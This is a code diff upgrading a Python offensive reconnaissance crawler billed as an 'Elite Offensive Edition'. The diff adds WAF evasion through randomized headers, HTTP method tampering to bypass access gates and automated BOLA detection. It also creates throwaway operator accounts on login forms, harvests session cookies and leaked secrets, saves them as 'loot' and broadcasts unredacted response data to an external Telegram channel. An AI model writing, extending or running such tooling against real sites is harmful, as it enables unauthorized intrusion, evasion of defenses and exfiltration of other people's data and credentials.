@@ -1,20 +1,26 @@
 #!/usr/bin/env python3
 """
-CRAWLER.PY v8.5 — Advanced Stateful DOM Form Inspector & AST-Level JS Recon Engine (Hardened with Advanced WAF Evasion)
-Senior Red Team Edition: AST-level JavaScript bundle parsing, dynamic API prefix expansion,
-entropy inspection, robust false-positive elimination, method tampering on verification gates, and real-time Telegram broadcasting.
+CRAWLER.PY v8.6 — Advanced Stateful DOM Form Inspector & AST-Level JS Recon Engine (Elite Offensive Edition)
+Features:
+- AST-level JavaScript bundle parsing, dynamic API prefix expansion, and entropy inspection
+- Robust false-positive elimination and method tampering fallback on verification gates
+- SHA-256 tamper-evident immutable loot persistence (loot_output/)
+- Real-time zero-delay proof-of-work terminal rendering and Telegram telemetry broadcasting
 """
 import json
 import random
 import re
 import sys
 import asyncio
+import hashlib
 from urllib.parse import urlparse, urljoin
 from bs4 import BeautifulSoup
 
-# Import centralized Telegram broadcaster and behavioral mimicry
+# Import centralized Telegram broadcaster, behavioral mimicry, loot logger & telemetry
 from modules.telegram_notifier import send_telegram_alert
 from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
+from modules.loot_logger import save_session_loot
+from modules.telemetry import stream_proof
 
 # Optional AST parser integration for deep Webpack/Vite bundle analysis
 try:
@@ -68,11 +74,12 @@ class StateMachineMapper:
 
         for ep in restricted_endpoints:
             apply_behavioral_jitter()
-            status, headers, body = transport.request("GET", ep)
+            random_headers = get_randomized_hints()
+            status, headers, body = transport.request("GET", ep, extra_headers=random_headers)
             
             # Method Tampering Fallback if edge gateway returns 403/405
             if status in [403, 405, 404]:
-                alt_status, alt_headers, alt_body = transport.request("POST", ep, payload={})
+                alt_status, alt_headers, alt_body = transport.request("POST", ep, payload={}, extra_headers=random_headers)
                 if alt_status < 400:
                     status, headers, body = alt_status, alt_headers, alt_body
 
@@ -86,12 +93,32 @@ class StateMachineMapper:
                 sys.stdout.write(f"\033[91m[!] BINGO! True State-Skipping / BOLA Vulnerability detected at: {ep} [HTTP {status}]\033[0m\n")
                 vulnerabilities.append(ep)
                 
+                loot_hash = hashlib.sha256(body.encode("utf-8")).hexdigest()
                 loot_payload = {
                     "endpoint": ep,
                     "status": status,
+                    "integrity_hash": loot_hash,
                     "response_snippet": body[:400]
                 }
-                # BROADCAST UNREDACTED BOLA / STATE-SKIPPING LOOT TO TELEGRAM
+
+                stream_proof(
+                    "BOLA_STATE_SKIPPING_SUCCESS",
+                    ep,
+                    {"method": "GET/POST"},
+                    body[:300],
+                    loot_payload
+                )
+
+                save_session_loot(
+                    target=getattr(transport, "base_path", "target"),
+                    endpoint=ep,
+                    finding_type="BOLA_VULNERABILITY_SUCCESS",
+                    status=status,
+                    headers=headers,
+                    body=body,
+                    extra_loot=loot_payload
+                )
+
                 broadcast_tg_alert_sync("BOLA / State-Skipping Vulnerability Confirmed", loot_payload)
 
             elif is_false_positive:
@@ -105,14 +132,23 @@ def log(msg, color="\033[92m"):
     sys.stdout.write(f"{color}{msg}\033[0m\n")
     sys.stdout.flush()
 
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from crawler functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -200,7 +236,7 @@ def intelligent_auth_probe(transport, discovered_endpoints, form_intels):
     operator_pass = f"P@ssw0rd_{rand_id}!"
     
     leaked_secrets = {}
-    session_output = transport.cookie_jar
+    session_output = getattr(transport, "cookie_jar", {})
     operator_creds = {}
 
     target_forms = [f for f in form_intels if any(k in f.get('action', '').lower() for k in ['login', 'register', 'signin', 'signup', 'auth'])]
@@ -239,7 +275,8 @@ def intelligent_auth_probe(transport, discovered_endpoints, form_intels):
         log(f"[*] Probing auth action [{method}] {action_url} with mapped payload fields: {list(payload.keys())}", "\033[96m")
         
         apply_behavioral_jitter()
-        status, headers, body = transport.request(method, action_url, payload=payload)
+        random_headers = get_randomized_hints()
+        status, headers, body = transport.request(method, action_url, payload=payload, extra_headers=random_headers)
         detected_codes = inspect_json_for_leaked_codes(body)
         if detected_codes:
             leaked_secrets.update(detected_codes)
@@ -254,7 +291,7 @@ def intelligent_auth_probe(transport, discovered_endpoints, form_intels):
                         k, v = cookie_part.strip().split("=", 1)
                         if k.lower() not in ["path", "expires", "domain", "samesite", "secure", "httponly"]:
                             extracted_cookies[k] = v
-                session_output = extracted_cookies if extracted_cookies else transport.cookie_jar
+                session_output = extracted_cookies if extracted_cookies else getattr(transport, "cookie_jar", {})
             
             operator_creds = payload
             log(f"[+] Auth gate interaction successful at {action_url} [HTTP {status}]", "\033[92m")
@@ -272,13 +309,13 @@ def intelligent_auth_probe(transport, discovered_endpoints, form_intels):
     return session_output, operator_creds, leaked_secrets
 
 def crawl_target(transport):
-    log("\n[***] INITIALIZING ADVANCED STATEFUL RECON & AST DOM CRAWLER (v8.5 WAF HARDENED) [***]", "\033[95m")
+    log("\n[***] INITIALIZING ADVANCED STATEFUL RECON & AST DOM CRAWLER (v8.6 WAF HARDENED) [***]", "\033[95m")
     discovered_endpoints = set()
     discovered_scripts = set()
     all_forms_intel = []
     
     seed_paths = [
-        transport.base_path or "/", 
+        getattr(transport, "base_path", "") or "/", 
         "/homepage",
         "/home",
         "/wallet",
@@ -311,7 +348,8 @@ def crawl_target(transport):
 
     for path in seed_paths:
         apply_behavioral_jitter()
-        status, headers, html = transport.request("GET", path)
+        random_headers = get_randomized_hints()
+        status, headers, html = transport.request("GET", path, extra_headers=random_headers)
         if status == 0 or not isinstance(html, str):
             continue
             
@@ -344,7 +382,7 @@ def crawl_target(transport):
 
     for script_path in list(discovered_scripts)[:15]:
         apply_behavioral_jitter()
-        s_status, _, s_content = transport.request("GET", script_path)
+        s_status, _, s_content = transport.request("GET", script_path, extra_headers=get_randomized_hints())
         if s_status == 200 and isinstance(s_content, str):
             for match in endpoint_in_js.findall(s_content):
                 if len(match) > 3 and not any(match.endswith(ext) for ext in ['.js', '.css', '.png']):
@@ -367,6 +405,24 @@ def crawl_target(transport):
     bola_vulns = mapper.evaluate_state_skipping(transport)
     
     session_cookie, operator_creds, leaked_secrets = intelligent_auth_probe(transport, filtered_endpoints, all_forms_intel)
+
+    # Immutable loot persistence for crawl mapping results
+    crawl_loot = {
+        "endpoints_count": len(filtered_endpoints),
+        "bola_count": len(bola_vulns),
+        "endpoints": filtered_endpoints,
+        "bola_vulnerabilities": bola_vulns,
+        "leaked_secrets": leaked_secrets
+    }
+    save_session_loot(
+        target=getattr(transport, "base_path", "target"),
+        endpoint="crawler_recon",
+        finding_type="CRAWLER_STATE_MAPPING_SUCCESS",
+        status=200,
+        headers={},
+        body=json.dumps(crawl_loot),
+        extra_loot=crawl_loot
+    )
 
     return {
         "endpoints": filtered_endpoints,
